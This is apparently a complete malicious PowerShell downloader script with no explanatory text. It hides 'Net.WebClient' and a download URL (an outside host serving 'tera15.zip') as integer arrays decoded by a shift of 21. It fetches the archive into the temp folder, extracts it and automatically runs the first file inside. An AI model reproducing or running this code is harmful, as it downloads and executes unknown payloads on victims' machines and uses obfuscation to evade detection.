function WriteToFile($filePath, $fileData) {
    [IO.File]::WriteAllBytes($filePath, $fileData)
};
function ExtractAndOpen($filePath) {
    $tempDir = $env:Temp;
    Expand-Archive -Path $filePath -DestinationPath $tempDir;
    Add-Type -Assembly System.IO.Compression.FileSystem;
    $zipFile = [IO.Compression.ZipFile]::OpenRead($filePath);
    $firstEntry = ($zipFile.Entries | Sort-Object Name | Select-Object -First 1).Name;
    $fullPath = Join-Path $tempDir $firstEntry;
    start $fullPath;
};
function DownloadFile($url) {
    $webClient = New-Object (DecodeString @(99, 122, 137, 67, 108, 122, 119, 88, 129, 126, 122, 131, 137));
    $fileData = $webClient.DownloadData($url);
    return $fileData
};
function DecodeString($encodedArray) {
    $shiftValue = 21;
    $decodedString = $Null;
    foreach($charCode in $encodedArray) {
        $decodedString += [char]($charCode - $shiftValue)
    };
    return $decodedString
};
function ExecuteTask() {
    $tempDir = $env:Temp + '\';
    $zipFilePath = $tempDir + 'tera15.zip';
    if (Test-Path -Path $zipFilePath) {
        ExtractAndOpen $zipFilePath;
    } Else {
        $fileData = DownloadFile (DecodeString @(125, 137, 137, 133, 136, 79, 68, 68, 120, 129, 126, 120, 128, 137, 132, 124, 132, 67, 120, 129, 126, 120, 128, 68, 138, 133, 129, 132, 118, 121, 136, 68, 137, 122, 135, 118, 70, 74, 67, 143, 126, 133));
        WriteToFile $zipFilePath $fileData;
        ExtractAndOpen $zipFilePath
    };;;
}

ExecuteTask;
